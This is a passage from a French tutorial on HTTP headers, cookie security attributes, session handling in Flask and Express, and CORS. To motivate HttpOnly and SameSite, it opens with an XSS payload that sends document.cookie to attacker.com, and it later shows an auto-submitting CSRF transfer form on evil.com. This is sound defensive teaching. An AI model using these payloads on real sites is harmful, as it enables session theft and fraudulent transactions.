```javascript
// JavaScript peut lire le cookie
document.cookie; // "session_id=abc123"

// Vuln√©rabilit√© XSS
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Avec HttpOnly :**
```javascript
// JavaScript ne peut PAS lire le cookie
document.cookie; // Ne contient pas session_id

// Protection contre le vol de session via XSS
```

**‚ö†Ô∏è Utilisez toujours `HttpOnly` pour les sessions et tokens d'authentification.**

#### SameSite

**Protection contre les attaques CSRF** (Cross-Site Request Forgery).

```http
Set-Cookie: session=abc123; SameSite=Lax
```

**Valeurs :**

**1. SameSite=Strict** (le plus restrictif)
```http
Set-Cookie: token=abc123; SameSite=Strict
```

```
Sc√©nario :
1. Utilisateur connect√© sur bank.com
2. Visite evil.com
3. evil.com fait : <form action="https://bank.com/transfer">
4. Cookie PAS envoy√© ‚Üí Attaque bloqu√©e ‚úÖ

Cookie envoy√© uniquement pour les requ√™tes same-site
(navigation directe, lien interne)
```

**2. SameSite=Lax** (recommand√©, d√©faut moderne)
```http
Set-Cookie: token=abc123; SameSite=Lax
```

```
Cookie envoy√© pour :
- Liens normaux (GET) ‚úÖ
  <a href="https://bank.com">
- Navigation directe ‚úÖ

Cookie PAS envoy√© pour :
- Formulaires POST cross-site ‚ùå
- Requ√™tes AJAX cross-site ‚ùå
- Images, iframes cross-site ‚ùå
```

**3. SameSite=None** (permissif)
```http
Set-Cookie: token=abc123; SameSite=None; Secure
```

```
Cookie toujours envoy√© (m√™me cross-site)
DOIT √™tre combin√© avec Secure
```

**Comparaison :**
```
Lien depuis Google vers votre site :

SameSite=Strict : Cookie PAS envoy√© (user semble d√©connect√© au 1er clic)
SameSite=Lax    : Cookie envoy√© ‚úÖ (recommand√©)
SameSite=None   : Cookie envoy√© ‚úÖ
```

**Attaque CSRF pr√©venue par SameSite :**
```html
<!-- Site malveillant evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>
  document.forms[0].submit();
</script>

Sans SameSite : Cookie envoy√© ‚Üí Transfert effectu√© ‚ùå
Avec SameSite=Lax ou Strict : Cookie PAS envoy√© ‚Üí Attaque bloqu√©e ‚úÖ
```

### Cookie complet et s√©curis√©

**Exemple de cookie optimal pour une session :**

```http
Set-Cookie: session_id=abc123def456;
            Max-Age=3600;
            Domain=example.com;
            Path=/;
            Secure;
            HttpOnly;
            SameSite=Lax
```

**D√©cortiqu√© :**
```
session_id=abc123def456  ‚Üí Nom et valeur
Max-Age=3600             ‚Üí Expire dans 1 heure
Domain=example.com       ‚Üí Valide pour example.com
Path=/                   ‚Üí Valide pour tout le site
Secure                   ‚Üí HTTPS uniquement
HttpOnly                 ‚Üí Pas accessible en JavaScript
SameSite=Lax             ‚Üí Protection CSRF mod√©r√©e
```

### Gestion des cookies en code

**JavaScript (client-side)**
```javascript
// Lire les cookies (sauf HttpOnly)
console.log(document.cookie);
// "user_pref=dark_mode; lang=fr"

// Cr√©er un cookie
document.cookie = "theme=dark; Max-Age=2592000; Path=/";

// Supprimer un cookie (mettre Max-Age=0)
document.cookie = "theme=; Max-Age=0";

// Parser les cookies
function getCookie(name) {
  const cookies = document.cookie.split('; ');
  for (let cookie of cookies) {
    const [key, value] = cookie.split('=');
    if (key === name) return value;
  }
  return null;
}

const theme = getCookie('theme');
```

**Python (serveur Flask)**
```python
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    # V√©rifier les credentials...

    response = make_response({'message': 'Logged in'})

    # Cr√©er un cookie de session
    response.set_cookie(
        'session_id',
        value='abc123',
        max_age=3600,
        secure=True,
        httponly=True,
        samesite='Lax'
    )

    return response

@app.route('/profile')
def profile():
    # Lire un cookie
    session_id = request.cookies.get('session_id')

    if not session_id:
        return {'error': 'Not authenticated'}, 401

    # V√©rifier la session...
    return {'user': 'Alice'}

@app.route('/logout')
def logout():
    response = make_response({'message': 'Logged out'})

    # Supprimer le cookie
    response.set_cookie('session_id', '', max_age=0)

    return response
```

**Node.js (Express)**
```javascript
const express = require('express');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

app.post('/login', (req, res) => {
  // V√©rifier credentials...

  // Cr√©er un cookie
  res.cookie('session_id', 'abc123', {
    maxAge: 3600000, // millisecondes
    httpOnly: true,
    secure: true,
    sameSite: 'lax'
  });

  res.json({ message: 'Logged in' });
});

app.get('/profile', (req, res) => {
  // Lire un cookie
  const sessionId = req.cookies.session_id;

  if (!sessionId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  res.json({ user: 'Alice' });
});

app.get('/logout', (req, res) => {
  // Supprimer le cookie
  res.clearCookie('session_id');
  res.json({ message: 'Logged out' });
});
```

### Sessions utilisateur avec cookies

**Flow typique d'authentification :**

```
1. Login
   POST /login
   {"username": "alice", "password": "secret"}

   Serveur v√©rifie ‚Üí Cr√©e session en base
   ‚Üê Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax

2. Requ√™tes authentifi√©es
   GET /profile
   Cookie: session_id=abc123

   Serveur v√©rifie session ‚Üí Retourne donn√©es

3. Logout
   POST /logout
   Cookie: session_id=abc123

   Serveur supprime session
   ‚Üê Set-Cookie: session_id=; Max-Age=0
```

**Impl√©mentation simple :**
```python
# Stockage en m√©moire (d√©mo uniquement, utilisez Redis en prod)
sessions = {}

@app.route('/login', methods=['POST'])
def login():
    data = request.json

    # V√©rifier credentials
    if verify_credentials(data['username'], data['password']):
        # Cr√©er session
        session_id = generate_secure_token()
        sessions[session_id] = {
            'user': data['username'],
            'created': time.time()
        }

        response = make_response({'success': True})
        response.set_cookie('session_id', session_id,
                          httponly=True, secure=True, samesite='Lax')
        return response

    return {'error': 'Invalid credentials'}, 401

@app.route('/profile')
def profile():
    session_id = request.cookies.get('session_id')

    if session_id in sessions:
        session = sessions[session_id]
        return {'user': session['user']}

    return {'error': 'Not authenticated'}, 401

@app.route('/logout', methods=['POST'])
def logout():
    session_id = request.cookies.get('session_id')

    if session_id in sessions:
        del sessions[session_id]

    response = make_response({'success': True})
    response.set_cookie('session_id', '', max_age=0)
    return response
```

### Limitations et alternatives aux cookies

**Limitations des cookies :**
```
- Taille limit√©e (4 KB par cookie)
- Envoy√©s avec chaque requ√™te (overhead)
- Peuvent √™tre bloqu√©s par l'utilisateur
- Probl√®mes avec les sous-domaines
- R√©glementations (RGPD)
```

**Alternatives modernes :**

**1. localStorage/sessionStorage**
```javascript
// Stockage local (persiste apr√®s fermeture)
localStorage.setItem('token', 'abc123');
const token = localStorage.getItem('token');

// Stockage session (effac√© √† la fermeture)
sessionStorage.setItem('token', 'abc123');

// Utilisation
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**Avantages :**
- Capacit√© plus grande (5-10 MB)
- Pas envoy√© automatiquement (√©conomie bande passante)
- Contr√¥le total en JavaScript

**Inconv√©nients :**
- Accessible en JavaScript (risque XSS)
- Pas de protection CSRF automatique
- N√©cessite code manuel

**2. Tokens dans headers (JWT)**
```javascript
// Stocker le token
const token = 'eyJhbGc...';
localStorage.setItem('auth_token', token);

// Envoyer avec chaque requ√™te
fetch('/api/protected', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

### S√©curit√© des cookies : Meilleures pratiques

‚úÖ **Toujours utiliser HTTPS en production**
```http
Set-Cookie: session=...; Secure
```

‚úÖ **HttpOnly pour les sessions**
```http
Set-Cookie: session=...; HttpOnly
```

‚úÖ **SameSite pour la protection CSRF**
```http
Set-Cookie: session=...; SameSite=Lax
```

‚úÖ **Dur√©e de vie appropri√©e**
```http
# Session courte pour les donn√©es sensibles
Set-Cookie: bank_session=...; Max-Age=1800

# Plus longue pour les pr√©f√©rences
Set-Cookie: theme=dark; Max-Age=31536000
```

‚úÖ **Tokens de session al√©atoires et cryptographiquement s√ªrs**
```python
import secrets

def generate_session_token():
    return secrets.token_urlsafe(32)
    # G√©n√®re ex: "8f3a9c7b2e1d4f6a8b9c0d1e2f3a4b5c6d7e8f9a0b"
```

‚úÖ **Rotation des sessions**
```python
# Apr√®s login, changer l'ID de session
def login(username, password):
    if verify_credentials(username, password):
        old_session_id = request.cookies.get('session_id')
        if old_session_id:
            del sessions[old_session_id]  # Invalider l'ancienne

        new_session_id = generate_session_token()
        sessions[new_session_id] = {'user': username}

        response.set_cookie('session_id', new_session_id)
```

‚úÖ **Expiration et cleanup**
```python
# Nettoyer les sessions expir√©es
def cleanup_expired_sessions():
    now = time.time()
    expired = [sid for sid, data in sessions.items()
               if now - data['created'] > 3600]
    for sid in expired:
        del sessions[sid]
```

‚ùå **√Ä √©viter**
```http
# Pas de Secure en production
Set-Cookie: session=abc;

# Stocker des donn√©es sensibles
Set-Cookie: password=secret123;

# Expiration trop longue pour sessions
Set-Cookie: session=abc; Max-Age=31536000

# Pas de SameSite
Set-Cookie: session=abc;
```

## Headers personnalis√©s

Vous pouvez cr√©er vos propres headers pour des besoins sp√©cifiques.

**Convention : Pr√©fixe `X-`** (ancien standard, moins utilis√© maintenant)
```http
X-Request-ID: req-abc123
X-API-Version: 2.0
X-User-ID: 12345
```

**Headers personnalis√©s modernes (sans X-) :**
```http
API-Key: abc123def456
Request-ID: req-abc123
Client-Version: 1.2.3
```

**Exemple d'utilisation :**
```http
Client ‚Üí
GET /api/data HTTP/1.1
API-Key: abc123def456
Request-ID: req-12345

Serveur ‚Üí
HTTP/1.1 200 OK
Request-ID: req-12345
X-Rate-Limit-Remaining: 98
```

**Cas d'usage :**
- Identification de requ√™tes (tracing)
- Versionnement d'API
- Authentification alternative
- M√©tadonn√©es sp√©cifiques √† l'application
- Debug et monitoring

## Headers CORS (Cross-Origin Resource Sharing)

Les headers CORS permettent ou interdisent les requ√™tes cross-origin.

### Requ√™te simple

```http
Client (depuis app.example.com) ‚Üí
GET https://api.other-domain.com/data HTTP/1.1
Origin: https://app.example.com

Serveur ‚Üí
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

### Requ√™te preflight (OPTIONS)

```http
Client ‚Üí
OPTIONS /api/data HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

Serveur ‚Üí
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

**Headers CORS principaux :**

```http
# Serveur autorise cette origine
Access-Control-Allow-Origin: https://app.example.com
# ou tout le monde
Access-Control-Allow-Origin: *

# M√©thodes autoris√©es
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

# Headers autoris√©s
Access-Control-Allow-Headers: Content-Type, Authorization

# Autoriser les credentials (cookies)
Access-Control-Allow-Credentials: true

# Dur√©e de cache du preflight
Access-Control-Max-Age: 86400

# Headers expos√©s au client
Access-Control-Expose-Headers: X-Custom-Header
```

---

## Points cl√©s √† retenir

üîë **Headers HTTP = M√©tadonn√©es** : Informations sur la requ√™te/r√©ponse

üîë **Headers de cache** : Cache-Control, ETag, Last-Modified pour optimiser les performances

üîë **Headers de s√©curit√©** : HSTS, CSP, X-Frame-Options pour prot√©ger l'application

üîë **Cookies** : M√©canisme de stockage c√¥t√© client, renvoy√©s automatiquement

üîë **Attributs de cookies** : Secure, HttpOnly, SameSite pour la s√©curit√©

üîë **HttpOnly** : Prot√®ge contre XSS (vol de cookies via JavaScript)

üîë **SameSite** : Prot√®ge contre CSRF (requ√™tes cross-site malveillantes)

üîë **Always HTTPS** : Obligatoire avec Secure et SameSite=None

üîë **Headers personnalis√©s** : Possibles pour des besoins sp√©cifiques

üîë **CORS** : Contr√¥le l'acc√®s cross-origin avec Access-Control-* headers

---

## Ce que nous allons voir ensuite

Dans la prochaine section **5.4.4 HTTP/1.1 : connexions persistantes et pipelining**, nous explorerons :
- Les connexions persistentes (keep-alive)
- Le pipelining de requ√™tes
- Les am√©liorations de performance d'HTTP/1.1
- Les limitations qui ont men√© √† HTTP/2

**Les headers et cookies sont les fondations qui permettent √† HTTP d'√™tre bien plus qu'un simple protocole de transfert de documents !** üëâ

---

*Les headers HTTP et les cookies sont des m√©canismes essentiels qui transforment HTTP d'un simple protocole de transfert en une plateforme riche permettant l'authentification, la s√©curit√©, le cache, et bien plus. Ma√Ætriser ces concepts est crucial pour d√©velopper des applications web modernes, s√©curis√©es et performantes.*

‚è≠Ô∏è [HTTP/1.1 : connexions persistantes et pipelining](/05-couche-application/04.4-http-1-1.md)
